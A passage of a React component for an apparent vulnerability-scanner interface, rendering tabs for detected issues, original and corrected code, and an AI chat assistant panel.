                  <div className={`rtab ${activeTab === 'vulns' ? 'on' : ''}`} onClick={() => setActiveTab('vulns')}><Bug size={12} /> Vulnerabilities{vulns.length > 0 && <span className="tab-count-badge">{vulns.length}</span>}</div>
                  <div className={`rtab ${activeTab === 'original' ? 'on' : ''}`} onClick={() => setActiveTab('original')}><Eye size={12} /> Original Code</div>
                  <div className={`rtab ${activeTab === 'corrected' ? 'on' : ''}`} onClick={() => setActiveTab('corrected')}><CheckCircle size={12} /> Corrected Code</div>
                  <div className="tab-spacer" />
                  <div className={`rtab-ai ${activeTab === 'sentry' ? 'on' : ''}`} onClick={() => setActiveTab('sentry')}><Sparkles size={12} /> Sentry AI</div>
                </div>

                {activeTab === 'vulns' && (
                  <div className="vulns-panel" style={{ animation: 'fadeIn 0.25s ease' }}>
                    <div className="vulns-panel-header"><div className="vulns-panel-title">Detected Issues — Click each card to expand Attack Simulation & AI Reasoning</div></div>
                    {vulns.length === 0 ? (<div className="vuln-empty"><div className="ve-icon"><CheckCircle size={28} /></div><h3 className="ve-h">// System Secure</h3><p className="ve-p">Deep scan returned zero critical findings. Baseline security integrity is optimal.</p></div>) : vulns.map((v, i) => <VulnCard key={i} v={v} i={i} />)}
                  </div>
                )}

                {activeTab === 'original' && (<div className="orig-panel" style={{ animation: 'fadeIn 0.25s ease' }}><div className="code-viewer"><div className="cv-header"><div className="cv-left"><div className="cv-dot" /><span className="cv-title">Source Code Analysis</span></div><span className="cv-lang">{language}</span></div><pre>{code}</pre></div></div>)}

                {activeTab === 'corrected' && (<div className="corr-panel" style={{ animation: 'fadeIn 0.25s ease' }}><div className="diff-title-row"><div><h3 className="diff-title">Neural Patch View</h3><p className="diff-sub">Comparing: Scanned Source (L) vs AI Corrected (R)</p></div><div className="auto-badge"><Sparkles size={11} /> Auto-Correction Verified</div></div><DiffViewer original={code} patched={scanMode === 'code' ? (CODE_SAMPLES[language]?.fixed || code) : 'Network hardening report generated.'} /></div>)}

                {activeTab === 'sentry' && (
                  <div className="sentry-panel" style={{ animation: 'fadeIn 0.25s ease' }}>
                    <div className="sentry-banner"><div className="sentry-orb">AI</div>Sentry AI Agent: Operational · Ask me anything about your vulnerabilities</div>
                    <div className="chat-wrap">
                      <div className="chat-head"><div className="chat-head-l"><div className="sentry-orb" style={{ width: 30, height: 30 }}>AI</div><span className="chat-head-title">Intelligence Hub</span></div><div className="neural-live"><div className="neural-dot" /><span className="neural-txt">Neural Link Active</span></div></div>
                      <div className="chat-msgs">
                        {chatMessages.length === 0 ? (<div className="chat-empty"><Sparkles size={34} style={{ opacity: 0.25 }} /><p>Initializing neural interface...</p></div>) : chatMessages.map((m, i) => (<div key={i} className={m.role === 'user' ? 'msg-user' : 'msg-bot'}>{m.text.split('\n').map((line, li) => <p key={li} style={{ marginBottom: li < m.text.split('\n').length - 1 ? 8 : 0 }}>{line}</p>)}</div>))}
                        {isTyping && <div className="msg-bot"><div className="typing"><div className="td" /><div className="td" /><div className="td" /></div></div>}
                        <div ref={chatEndRef} />
                      </div>
                      {chatMessages.length > 0 && !isTyping && (<div className="suggestions">{SUGGEST_QS.map((q, i) => (<button key={i} className="suggest-btn" onClick={() => sendAIQuery(q)}>{q}</button>))}</div>)}
                      <div className="chat-input-row">
                        <input className="chat-inp" placeholder="Ask about vulnerabilities, fixes, risk levels, breaches..." value={chatInput} onChange={e => setChatInput(e.target.value)} onKeyDown={e => e.key === 'Enter' && sendAIQuery()} />
                        <RippleBtn className={`chat-send ${isTyping || !chatInput.trim() ? 'off' : 'on'}`} onClick={() => sendAIQuery()} disabled={isTyping || !chatInput.trim()}><Send size={14} /></RippleBtn>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </main>
      </div>
    </>
  )
}